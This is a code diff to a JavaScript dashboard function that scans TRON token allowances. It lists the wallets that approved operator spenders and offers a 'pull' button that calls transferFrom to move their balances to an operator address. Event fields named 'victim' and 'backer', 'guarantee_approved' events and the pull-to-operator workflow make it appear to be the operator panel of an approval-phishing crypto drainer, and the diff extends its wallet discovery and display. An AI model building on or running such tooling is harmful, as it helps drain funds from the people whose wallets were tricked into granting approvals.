@@ -2356,15 +2356,16 @@ async function scanAllowances() {
       // die allowance-Abfrage zeigt dann den echten Stand, notfalls 0.
       // direct_approved war nicht gelistet — /direct-Approvals tauchten
       // nur zufaellig ueber das Discovery-Kreuzprodukt auf.
-      if ((ev.ev === "approve_sent" || ev.ev === "guarantee_approved"
-           || ev.ev === "direct_approved" || ev.ev === "approve_rejected") && d.from && d.spender) {
+      if (((ev.ev === "approve_sent" || ev.ev === "guarantee_approved"
+           || ev.ev === "direct_approved" || ev.ev === "approve_rejected")
+           || ((ev.ev === "confirmed" || ev.ev === "broadcast") && d.op === "approve")) && d.from && d.spender) {
         var sym = (d.token || "USDT").split(" ")[0];
         pairs[d.from + "|" + d.spender + "|" + sym] = { owner: d.from, spender: d.spender, token: sym };
       }
       if (ev.ev === "contract_deployed" && d.contract) contracts[d.contract] = true;
       // Discovery-Sets: verbundene Wallets × gesehene Spender/Contracts —
       // deckt Paare ab, deren Erfolg nie als approve_sent geloggt wurde
-      ["from", "backer", "victim", "addr"].forEach(function(k) {
+      ["from", "backer", "victim", "addr", "wallet"].forEach(function(k) {
         if (isTronAddr(d[k] || "")) wallets[d[k]] = true;
       });
       ["spender", "contract", "to"].forEach(function(k) {
@@ -2486,12 +2487,14 @@ async function scanAllowances() {
     }
     if (bp && sp && isTronAddr(bp.value) && isTronAddr(sp.value)) checkPair();
     // Session-Ansicht: jede Wallet die approved hat = eine Card.
-    // Nur aktive Allowances (allow > 0) sind actionable — Rest ausblenden.
+    // ALLE Paare rendern — Allowance + Balance auch bei 0 immer sichtbar;
+    // Read-Fehler kommen mit „?"-Werten ans Ende.
     // Reihenfolge: pullbar (aktiver Operator) zuerst, dann inaktive
-    // Operator-Slots, dann Fremd-Allowances in die eingeklappte Sektion.
-    var sorted = rows.filter(function(r) { return r && r.allow && r.allow > 0n; })
+    // Operator-Slots, dann Fremd-Allowances, zuletzt Read-Fehler.
+    var sorted = rows.filter(function(r) { return !!r; })
       .sort(function(a, b) {
         function rank(r) {
+          if (r.allow === null || r.allow === undefined) return 4;
           if (OP.tron && r.spender === OP.tron) return r.pull && r.pull > 0n ? 0 : 1;
           return opSlotOf(r.spender) ? 2 : 3;
         }
@@ -2531,7 +2534,9 @@ async function scanAllowances() {
             + ' title="transferFrom → ' + esc(shortAddr(pullDest() || OP.tron)) + '">pull ⚡</button>'
           : r.pull === null
             ? '<span class="log-badge" style="opacity:.6;" title="Balance-Read fehlgeschlagen — Refresh erneut versuchen">read fehler</span>'
-            : '<span class="log-badge" style="opacity:.6;" title="Allowance vorhanden, aber Wallet-Balance ist 0">balance 0</span>';
+            : r.allow === 0n
+              ? '<span class="log-badge" style="opacity:.6;" title="Keine Allowance auf diesen Spender">no allowance</span>'
+              : '<span class="log-badge" style="opacity:.6;" title="Allowance vorhanden, aber Wallet-Balance ist 0">balance 0</span>';
       } else if (!isContract && isOtherOp) {
         // Allowance auf einem inaktiven Operator-Slot — pullbar sobald
         // der passende Slot aktiviert wird, nicht „fremder Spender".
@@ -2551,8 +2556,8 @@ async function scanAllowances() {
         + '<div style="padding:0 2px 7px;font-size:.64rem;color:var(--text-muted);letter-spacing:.02em;">spender <code class="fulladdr" title="Click to copy" onclick="copyAddr(this)">' + esc(r.spender) + '</code>'
         + (isOp ? ' <span class="op-chip">aktiver operator</span>' : '') + '</div>'
         + '<div class="sess-stats">'
-        + '<div><span class="k">Allowance</span><span class="v">' + esc(unitsToHuman(r.allow, r.dec || 6)) + '</span></div>'
-        + '<div><span class="k">Balance</span><span class="v">' + esc(unitsToHuman(r.bal, r.dec || 6)) + '</span></div>'
+        + '<div><span class="k">Allowance</span><span class="v">' + esc(r.allow === null || r.allow === undefined ? "?" : unitsToHuman(r.allow, r.dec || 6)) + '</span></div>'
+        + '<div><span class="k">Balance</span><span class="v">' + esc(r.bal === null || r.bal === undefined ? "?" : unitsToHuman(r.bal, r.dec || 6)) + '</span></div>'
         + '<div><span class="k">Pullable</span><span class="v hi">' + esc(pullTxt) + ' ' + esc(r.token) + '</span></div>'
         + '</div></div>';
       // Operator-Paare (alle Slots) prominent oben; Fremd-Allowances
